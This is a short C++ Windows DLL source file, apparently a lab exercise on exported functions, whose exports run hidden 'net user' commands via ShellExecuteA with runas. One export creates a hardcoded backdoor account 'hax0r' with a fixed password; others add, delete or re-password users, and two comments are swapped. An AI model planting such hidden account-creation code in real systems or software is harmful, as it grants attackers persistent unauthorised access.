/*
Name: Russell Harvey
*/

// dllmain.cpp : Defines the entry point for the DLL application.
#include "stdafx.h"
#include <stdio.h>
#include <shellapi.h>
#include <string.h>
#include <Windows.h>
#include <strsafe.h>
#include <netfw.h>

/*
This function can fetched with GetProcAddress
*/
extern "C" __declspec(dllexport)
void message(void)
{
	char phrase[100];
	char msg[50];

	printf("Enter a message: ");
	scanf_s("%s", msg, 50);
	sprintf_s(phrase, 100, "Your message is %s\n", msg);
	printf("%s", phrase);
}

/*
This function cannot be fetched with GetProcAddress
*/
void nothello(void)
{
	printf("BLAH");
}

/*
This function can fetched with GetProcAddress
*/
extern "C" __declspec(dllexport)
void shellexec(void)
{
	
	char verb[10] = "runas";
	char cmd[10] = "net";
	char params[30] = "user hax0r hax0r123 /add";

	//ARG1: NULL -> Pointer to a window that can be used to display error messages
	//ARG2: Operation -> run or runas. Runas executes a command as admin. Can also be used for other things as well (find, explore, etc.)
	//ARG3: File -> this is the binary to execute.
	//ARG4: Parameters -> These are the command line parameters to pass to the command
	//ARG5: Working directory -> This is the path to the working directory for the context of the process execution. 0 is no working directory. None needed in this case.
	//ARG6: UI descriptor -> This describes how the OS should handle displaying the Window. SW_HIDE means to hide the window. SD_SHOW and SD_SHOWNORMAL also commonly used.
	ShellExecuteA(NULL, verb, cmd, params, 0, SW_HIDE);
	
}

/*
Adds a User to the Windows System
*/
extern "C" __declspec(dllexport)
void addUser(char user[], char pass[]) {
	char verb[10] = "runas";
	char cmd[10] = "net";
	char params[60];
	sprintf_s(params, 60, "user %s %s /add", user, pass);
	printf("Executing command: %s\n", params);
	ShellExecuteA(NULL, verb, cmd, params, 0, SW_HIDE);
	printf("User '%s' has been successfully added.\n", user);
}

/*
Deletes a User from the Windows System
*/
extern "C" __declspec(dllexport)
void chPass(char user[], char pass[]) {
	char verb[10] = "runas";
	char cmd[10] = "net";
	char params[60];
	sprintf_s(params, 60, "user %s %s", user, pass);
	printf("Executing command: %s\n", params);
	ShellExecuteA(NULL, verb, cmd, params, 0, SW_HIDE);
	printf("User '%s' has been successfully changed password to %s.\n", user, pass);
}

/*
Changes a User's Password
*/
extern "C" __declspec(dllexport)
void delUser(char user[]) {
	char verb[10] = "runas";
	char cmd[10] = "net";
	char params[60];
	sprintf_s(params, 60, "user %s /del", user);
	printf("Executing command: %s\n", params);
	ShellExecuteA(NULL, verb, cmd, params, 0, SW_HIDE);
	printf("User '%s' has been successfully deleted.\n", user);
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

